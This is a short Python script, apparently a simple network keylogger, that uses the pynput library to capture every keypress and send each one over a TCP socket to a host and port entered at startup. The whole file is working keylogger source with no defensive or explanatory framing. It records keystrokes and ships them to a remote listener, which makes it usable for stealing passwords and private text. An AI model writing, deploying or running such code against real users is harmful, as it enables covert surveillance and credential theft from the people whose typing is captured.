from pynput import keyboard
import socket
h = input("Set host: ")
p = int(input("Set port: "))

def on_press(key):
    a = key
    b = str(a)
    print(b)
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((h, p))
        s.sendall(bytes(b, 'UTF-8'))
        data = s.recv(1024)

    print(f"Received {data!r}")

with keyboard.Listener(
        on_press=on_press) as listener:
    listener.join()

